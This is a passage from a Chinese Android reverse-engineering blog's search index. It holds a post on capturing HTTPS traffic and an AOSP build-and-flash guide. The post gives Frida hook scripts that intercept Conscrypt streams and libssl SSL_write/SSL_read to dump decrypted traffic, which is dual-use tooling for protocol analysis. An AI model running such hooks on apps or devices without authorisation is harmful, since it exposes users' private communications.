.map(DebugSymbol.fromAd","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:3:4","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Https ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:4:0","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"客户端代码 在AndroidManifest.xml文件赋予权限: \u003cuses-permission android:name=\"android.permission.INTERNET\"/\u003e 布局 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cLinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" android:gravity=\"center|center_horizontal|center_vertical\" tools:context=\".MainActivity\"\u003e \u003cButton android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:gravity=\"center|center_horizontal|center_vertical\" android:id=\"@+id/mybtn\" android:text=\"发送请求\" android:textSize=\"45sp\"\u003e \u003c/Button\u003e \u003c/LinearLayout\u003e MainActivity.java package com.example.luohttps; import androidx.annotation.NonNull; import androidx.appcompat.app.AlertDialog; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.os.Handler; import android.os.Message; import android.view.View; import android.widget.Button; import java.io.IOException; import java.io.InputStream; import java.net.HttpURLConnection; import java.net.URL; public class MainActivity extends AppCompatActivity { private static String TAG = \"XiaLuoHun\"; private Handler handler = null; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); initHandler(); // 定位发送请求按钮 Button btn = findViewById(R.id.mybtn); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { getResponse(\"https://www.baidu.com\"); } }); } private void httpUrlConnection(String strUrl){ try { URL url = new URL(strUrl); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); //设置Http请求方法 connection.setRequestMethod(\"GET\"); //设置请求参数 connection.setRequestProperty(\"token\",\"LuoHun\"); //设置连接超时时间 connection.setConnectTimeout(8000); //设置接收超时时间 connection.setReadTimeout(8000); // 开始连接 connection.connect(); //得到响应码 //int responseCode = connection.getResponseCode(); /* if(responseCode == HttpURLConnection.HTTP_OK){ //... }*/ //获取服务器返回的输入流 InputStream in = connection.getInputStream(); //if(in.available() \u003e 0){ // 每次写入1024字节 int bufferSize = 1024; byte[] buffer = new byte[bufferSize]; StringBuffer sb = new StringBuffer(); while ((in.read(buffer)) != -1) { sb.append(new String(buffer)); } sendMsg(sb.toString()); //Log.d(\"LuoHun\", sb.toString()); //关闭Http连接 connection.disconnect(); // } } catch (IOException e) { e.printStackTrace(); } } private void getResponse(String strUrl) { new Thread(new Runnable() { @Override public void run() { httpUrlConnection(strUrl); } }).start(); } private void initHandler() { handler = new Handler(getMainLooper(), new Handler.Callback() { @Override public boolean handleMessage(@NonNull Message msg) { if (msg.what == 1){ AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this); builder.setTitle(\"NOTICE\"); builder.setMessage((String) msg.obj); builder.setPositiveButton(\"Confirm\",null); builder.create().show(); } return false; } }); } private void sendMsg(String message){ Message msg = new Message(); msg.what = 1; msg.obj = message; handler.sendMessage(msg); } } ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:4:1","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Java层抓包 观察上述开发流程,我们发现以下几个关键函数: URL类的构造函数,其包含了目标网址的字符串 收包函数,HttpURLConnection.getInputStream() 跟踪URL构造函数 //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/URL.java public URL(String spec) 很容易写出下面的Hook代码: function hookURL() { var URL = Java.use('java.net.URL') URL.$init.overload('java.lang.String').implementation = function(urlstr){ console.log('url =\u003e ', urlstr) return this.$init(urlstr) } } function hookSSL() { Java.perform(function () { hookURL() }) } setImmediate(hookSSL()) 常规跟踪收包函数 接下来跟踪HttpURLConnection类的getInputStream函数. 首先注意到HttpURLConnection是一个抽象类,需要找到它的具体实现类. 通过动态调试,确定HttpURLConnection的具体实现类为com.android.okhttp.internal.huc.HttpsURLConnectionImpl 接下来跟踪HttpsURLConnectionImpl类的getInputStream函数. //http://androidxref.com/8.1.0_r33/xref/external/okhttp/okhttp-urlconnection/src/main/java/com/squareup/okhttp/internal/huc/HttpsURLConnectionImpl.java 这里发现HttpsURLConnectionImpl类中并没有getInputStream函数,去父类看看. //http://androidxref.com/8.1.0_r33/xref/external/okhttp/okhttp-urlconnection/src/main/java/com/squareup/okhttp/internal/huc/DelegatingHttpsURLConnection.java 对于上面的代码,看起来是有点懵的,那该如何弄呢? 我们可以换种思路,Https属于应用层协议,最终要经过传输层进行传输(即Socket),那我们可以搜索上述Demo内存中与Socket相关的类并全部Hook,重新点击\"发送请求\"按钮,看会经过哪些比较可疑的类并进一步分析.这里也许有一部分人有些疑问,既然上面我们已经分析了Tcp的调用链,那我们用上面Tcp的Hook代码然后打印调用栈,一步步进行回溯不就可以找到Https加密前和解密后的收发包接口了吗,经测试这种方案是不行的,Https不走上述路径,但是可以用来抓Http数据. 可以参考下述中的sock_read和sock_write函数来解释为什么Https不走我们上述分析的Tcp路径. http://androidxref.com/8.1.0_r33/xref/external/boringssl/src/crypto/bio/socket.c 前期研究 点击App界面上的发送请求按钮后,使用Objection搜索内存中Socket相关的类 objection.exe -g com.example.luohttps explore android hooking search classes socket 将搜索出来的结果复制到1.txt文件中,并在每一行前添加android hooking watch class 结束上述App进程,利用objection -c参数批量Hook Socket相关类(如果出现崩溃现象,可以删除或将导致崩溃的类移到另一个文件中待下次执行即可) objection.exe -g com.example.luohttps explore -c .\\1.txt 点击App界面上的\"发送请求\"按钮,会发现下图中的几个与Socket相关的类被调用了 观察上图,发现上面两个看着很可疑的函数,可以进一步Hook进行确认是否是Https的收发包接口 //http://androidxref.com/8.1.0_r33/xref/external/conscrypt/common/src/main/java/org/conscrypt/ConscryptFileDescriptorSocket.java com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write([B, int, int) com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read([B, int, int) 用下方Hook代码进行测试,确认上述两个函数为Https的收发包接口 function getAddrInfo(socket, isRead) { var src_addr = '' var src_port = '' var dst_addr = '' var dst_port = '' if (isRead) { src_addr = socket.getRemoteSocketAddress().toString().split(\":\")[0].split(\"/\").pop() src_port = socket.getRemoteSocketAddress().toString().split(\":\").pop() dst_addr = socket.getLocalAddress().toString().split(\":\")[0].split(\"/\").pop() dst_port = socket.getLocalPort().toString() } else { src_addr = socket.getLocalAddress().toString().split(\":\")[0].split(\"/\").pop() src_port = socket.getLocalPort().toString() dst_addr = socket.getRemoteSocketAddress().toString().split(\":\")[0].split(\"/\").pop() dst_port = socket.getRemoteSocketAddress().toString().split(\":\").pop() } return src_addr + ':' + src_port + ' --\u003e ' + dst_addr + ':' + dst_port } function hookSSLOutputStream() { //com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream').write.overload('[B', 'int', 'int').implementation = function (buf, offset, byteCount) { var result = this.write(buf, offset, byteCount) //console.log('result', result, 'offset', offset, 'byteCount', byteCount) //打印数据包的源和目标地址 var socket = this.this$0.value.socket.value var msg = getAddrInfo(socket, false) console.log('SSLOutputStream.write', msg) //打印发包内容 var ptr = Memory.alloc(byteCount); for (var i = 0; i \u003c byteCount; ++i) Memory.writeS8(ptr.add(i), buf[offset + i]); console.log(hexdump(ptr, { offset: 0, length: byteCount, header: false, ansi: false })); return result } } function hookSSLInputStream() { //com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStre","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:4:2","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Jni层抓包 在上面Java层抓包中,我们找到了Https Java层最深处的发包函数(SSL_write)和收包函数(SSL_read),这里我们继续沿着这两个函数跟踪C层的调用链,以寻求最佳Hook点. 跟踪发包函数 //http://androidxref.com/8.1.0_r33/xref/external/conscrypt/common/src/main/java/org/conscrypt/NativeCrypto.java static native void SSL_write(long sslNativePointer, FileDescriptor fd,SSLHandshakeCallbacks shc, byte[] b, int off, int len, int writeTimeoutMillis) //搜索NativeCrypto_SSL_write //http://androidxref.com/8.1.0_r33/xref/external/conscrypt/common/src/jni/main/cpp/NativeCrypto.cpp static void NativeCrypto_SSL_write(JNIEnv* env, jclass, jlong ssl_address, jobject fdObject,jobject shc, jbyteArray b, jint offset, jint len, jint write_timeout_millis) -\u003estatic int sslWrite(JNIEnv* env, SSL* ssl, jobject fdObject, jobject shc, const char* buf, jint len, OpenSslError\u0026 sslError, int write_timeout_millis) //http://androidxref.com/8.1.0_r33/xref/external/boringssl/src/ssl/ssl_lib.cc //最终编译在libssl.so中 -\u003eint SSL_write(SSL *ssl, const void *buf, int num){ //SSL结构体在下面定义 //http://androidxref.com/8.1.0_r33/xref/external/boringssl/include/openssl/base.h //http://androidxref.com/8.1.0_r33/xref/external/boringssl/src/ssl/internal.h //--- //这里根据不同ssl版本调用不同的函数,所以说下面找函数应该带上版本,如ssl3_write_app_data ret = ssl-\u003emethod-\u003ewrite_app_data(ssl, \u0026needs_handshake, (const uint8_t *)buf, num); //--- } //http://androidxref.com/8.1.0_r33/xref/external/boringssl/src/ssl/s3_pkt.cc -\u003eint ssl3_write_app_data(SSL *ssl, int *out_needs_handshake, const uint8_t *buf, int len) //下面这个函数就是Https 发包过程中明文数据的终点 -\u003estatic int do_ssl3_write(SSL *ssl, int type, const uint8_t *buf, unsigned len) 跟踪收包函数 //http://androidxref.com/8.1.0_r33/xref/external/conscrypt/common/src/main/java/org/conscrypt/NativeCrypto.java static native int SSL_read(long sslNativePointer, FileDescriptor fd, SSLHandshakeCallbacks shc, byte[] b, int off, int len, int readTimeoutMillis) //搜索NativeCrypto_SSL_read //http://androidxref.com/8.1.0_r33/xref/external/conscrypt/common/src/jni/main/cpp/NativeCrypto.cpp static jint NativeCrypto_SSL_read(JNIEnv* env, jclass, jlong ssl_address, jobject fdObject, jobject shc, jbyteArray b, jint offset, jint len, jint read_timeout_millis) -\u003estatic int sslRead(JNIEnv* env, SSL* ssl, jobject fdObject, jobject shc, char* buf, jint len, OpenSslError\u0026 sslError, int read_timeout_millis) //http://androidxref.com/8.1.0_r33/xref/external/boringssl/src/ssl/ssl_lib.cc //最终编译在libssl.so中 -\u003eint SSL_read(SSL *ssl, void *buf, int num) -\u003estatic int ssl_read_impl(SSL *ssl, void *buf, int num, int peek){ //--- //这里根据不同ssl版本调用不同的函数,所以说下面找函数应该带上版本,如ssl3_read_app_data int ret = ssl-\u003emethod-\u003eread_app_data(ssl, \u0026got_handshake, (uint8_t *)buf, num, peek); //--- } //http://androidxref.com/8.1.0_r33/xref/external/boringssl/src/ssl/s3_pkt.cc -\u003eint ssl3_read_app_data(SSL *ssl, int *out_got_handshake, uint8_t *buf, int len, int peek) Hook代码 观察上述调用链,考虑到源和目标地址的获取难易程度以及收发包数据获取的通用性,对Https来说,Jni层的发包函数Hook点通常选择libssl.so的SSL_write函数,收包函数通常选择libssl.so的SSL_read函数.故可写出下述Hook代码: var sslGetFdPtr = null var SSL_get_sessionPtr = null var SSL_SESSION_get_idPtr = null var sslGetFd = null var SSL_get_session = null var SSL_SESSION_get_id = null function initializeGlobals() { sslGetFdPtr = Module.getExportByName(\"libssl.so\", \"SSL_get_rfd\"); SSL_get_sessionPtr = Module.getExportByName(\"libssl.so\", \"SSL_get_session\") SSL_SESSION_get_idPtr = Module.getExportByName(\"libssl.so\", \"SSL_SESSION_get_id\") sslGetFd = new NativeFunction(sslGetFdPtr, 'int', ['pointer']) SSL_get_session = new NativeFunction(SSL_get_sessionPtr, \"pointer\", [\"pointer\"]) SSL_SESSION_get_id = new NativeFunction(SSL_SESSION_get_idPtr, \"pointer\", [\"pointer\", \"pointer\"]) } function getSslSessionId(ssl) { var session = SSL_get_session(ssl); if (session == 0) { return 0; } var len = Memory.alloc(4); var p = SSL_SESSION_get_id(session, len); len = Memory.readU32(len); var session_id = \"\"; for (var i = 0; i \u003c len; i++) { // Read a byte, convert it to a hex string (0xAB ==\u003e \"AB\"), and append // it to session_id. session_id += (\"0\" + Memory.readU8(p.add(i)","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:4:3","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e r0capture ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:5:0","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android Rom"],"content":"虚拟机配置 这里选择的虚拟机是Kali https://www.kali.org/get-kali/#kali-virtual-machines ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:0","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"基本配置 cpu这里给4核2线程,内存一般给12G(这里咱们内存大,直接给20G,也就是20480M).少于12G会报out of memory错误. 磁盘空间这里给450G ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:1","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"以root用户登录 Kali Linux虚拟机官方提供了一个默认账号:kali/kali,但是并没有提供root账号. 可以先用kali/kali进入虚拟机,执行以下命令设置root账号密码. sudo passwd root 进行重置root密码,重置密码需要输入两次. 重启虚拟机,用root账号登录. ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:2","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"设置时区 dpkg-reconfigure tzdata 在弹出窗口选择 Asia-\u003eshanghai ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:3","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"字体安装 在/usr/share/fonts目录下,创建一个文件夹my_fonts 将ttf格式字体复制到/usr/share/fonts/my_fonts目录下 ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:4","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"切换shell为bash //这里我们要切换到bash,目前Kali默认是zsh //切换bash chsh -s /bin/bash 重启后生效. ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:5","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"关闭息屏和休眠 ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:6","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"安装小工具 apt update apt install htop jnettop tree ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:7","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"新建分区 使用gparted这个软件,在unallocated部分右击,选择\"New\",按照默认即可,即可新建一个370G的分区. 点击选择Apply,应用到磁盘.然后将这个新建的磁盘给mount到某个文件夹: cd Desktop mkdir COMPILE //fdisk -l 查看磁盘信息 mount /dev/sda3 COMPILE ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:8","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"源码下载 谷歌官方提供了Android每个版本的原生源码,其官网为: https://android.googlesource.com/ 由于谷歌官方的源码服务器搭建在国外,国内用户访问很卡顿,幸运的是国内有清华源和中科大源,存储着与谷歌官方提供一致的Android源码供国内开发者使用,其链接分别如下: https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/ http://mirrors.ustc.edu.cn/aosp/ 接下来以中科大源为例进行Android源码的下载. ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:0","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"下载Repo Repo是Android官方推出的另一个版本管理工具,封装了一系列的Git命令.要想下载Android源码,必须先下载Repo工具. mkdir ~/bin PATH=~/bin:$PATH curl https://storage.googleapis.com/git-repo-downloads/repo \u003e ~/bin/repo chmod a+x ~/bin/repo ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:1","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"配置Git git config --global user.name \"Your name\" git config --global user.email \"you@example.com\" ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:2","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"同步源码 这里我们以获取特定版本的Android源码为例,可通过如下网址查Android版本. https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds //先达到指定目录,然后开始同步Android源码. cd /root/Desktop/COMPILE mkdir aosp810_r1 cd aosp810_r1/ //下载指定版本的Android源码,这里下载android-8.1.0_r1 repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-8.1.0_r1 repo sync 如果提示无法连接到gerrit.googlesource.com,将如下内容复制到你的~/.bashrc里. export REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo' ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:3","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"下载驱动包 在下述网址搜索上述下载的Android版本(android-8.1.0_r1),找到build ID. https://source.android.com/setup/start/build-numbers android-8.1.0_r1对应的build ID为OPM1.171019.011 在下述网址先定位到要刷入的手机型号(这里我目前使用的手机为Pixel sailfish),然后搜索上述build ID,定位驱动下载链接. https://developers.google.com/android/drivers //上述两个链接都要下载 https://dl.google.com/dl/android/aosp/google_devices-sailfish-opm1.171019.011-f3bafc8b.tgz https://dl.google.com/dl/android/aosp/qcom-sailfish-opm1.171019.011-247af472.tgz 下载驱动包到Android源码所在目录. 解压. tar zxvf google_devices-sailfish-opm1.171019.011-f3bafc8b.tgz tar zxvf qcom-sailfish-opm1.171019.011-247af472.tgz ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:3:0","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"准备编译环境 apt update apt install bison tree dpkg --add-architecture i386 apt update apt install libc6:i386 libncurses5:i386 libstdc++6:i386 libxml2-utils //安装OpenJdk8 wget https://download.java.net/openjdk/jdk8u41/ri/openjdk-8u41-b04-linux-x64-14_jan_2020.tar.gz //解压 tar zxvf openjdk-8u41-b04-linux-x64-14_jan_2020.tar.gz //编写~/.bashrc,添加环境变量 export JAVA_HOME=/root/Desktop/java-se-8u41-ri export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar //配置python2环境 //这里使用pyenv来安装python2的版本 //①配置pyenv构建环境 sudo apt-get update; sudo apt-get install make build-essential libssl-dev zlib1g-dev \\ libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \\ libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev //②下载pyenv proxychains git clone https://github.com/yyuu/pyenv.git ~/.pyenv //③配置pyenv环境变量 echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' \u003e\u003e~/.bashrc echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' \u003e\u003e~/.bashrc echo -e 'if command -v pyenv 1\u003e/dev/null 2\u003e\u00261; then\\n eval \"$(pyenv init --path)\"\\nfi'\u003e\u003e~/.bashrc source ~/.bashrc //④这里安装python2.7.16 PYTHON_CONFIGURE_OPTS=\"--disable-ipv6\" proxychains pyenv install 2.7.16 //⑤配置全局python版本 pyenv global 2.7.16 至此环境已经准备好了,到这里我们关机打个快照. ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:4:0","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"源码编译 挂载磁盘. //重新开机后需要先挂载磁盘. mount /dev/sda3 COMPILE 新建10G的交换分区. dd if=/dev/zero of=swapfile bs=1M count=10240 //mkswap创建交换文件 mkswap swapfile //swapon激活 sudo swapon swapfile 在Android源码目录执行下述命令. //下述两个文件,就是上面驱动包解压出来的 //执行后,要按一直按着Enter键,直到出现需要用户输入\"I ACCEPT\"选项,输入I ACCEPT //如果一直按着Enter键,到了末尾也没见提示用户输入,就先按Ctrl+C然后按Ctrl+D,就可以看到提示用户输入了. ./extract-google_devices-sailfish.sh ./extract-qcom-sailfish.sh //编译安卓源码前执行以下命令 export LC_ALL=C //导入环境变量 source build/envsetup.sh //选择设备 lunch //这里我目前使用的手机为Pixel sailfish //选择的是 24 aosp_sailfish-userdebug 24 //编译 m -j4 这里需要提一点的就是与lunch命令相关的构建类型,根据下述Android官网内容显示,在编译的时候可以选择的类型分为user、userdebug以及eng.其中user类型编译出来的镜像是无Root权限的. https://source.android.com/setup/build/building#choose-a-target 然而在我们执行\"lunch\"命令之后,似乎没有发现user类型,那我们是否无法编译出一个无Root权限的镜像? 经过实践可知,如果在选择编译目标时将带有userdebug文字中的debug字段去掉,就可以编译出不带Root权限的镜像. //只需将上述编译流程中的lunch替换为下述语句即可. //下述语句对应的是24,lunch aosp_sailfish-userdebug,这里只是将debug字段去掉. lunch aosp_sailfish-user ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:5:0","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"自编译系统刷机 ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:6:0","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"方式一 手机进bootloader模式. adb reboot bootloader 执行下述命令,进行刷机. //首先执行完 source build/envsetup.sh fastboot -w flashall ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:6:1","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"方式二 上述编译出来的系统镜像默认放在源码根目录的\"out/target/product/设备代号/“目录下(这里的设备代号即为Pixel对应的sailfish代号) 如果想要将编译出来的镜像刷入设备,还需要从Android镜像官网下载与我们上述源码编译下载的版本一致的镜像. Android镜像官网如下: https://developers.google.com/android/images 上面我们源码下载的镜像为android-8.1.0_r1对应的build ID为OPM1.171019.011,编译出的镜像适配Google Pixel代号为sailfish的设备.故我们要在上述Android镜像官网中找到Pixel sailfish对应的版本代号为OPM1.171019.011的镜像下载地址. 对应的链接地址如下: https://dl.google.com/dl/android/aosp/sailfish-opm1.171019.011-factory-56d15350.zip 接下来就是下载上述镜像,然后解压,用我们编译出来的img镜像文件进行替换,最后执行flash-all.sh脚本进行刷机. adb reboot bootloader ./flash-all.sh 至此,一个自定义的Android系统就成功编译并刷机成功了. ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:6:2","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"将源码导入AS工具中 将Android源码导入Android Studio工具中,可以利用AS的智能提示,帮助我们在源码修改中避免一些拼写以及语法上的错误. ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:7:0","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"下载AS 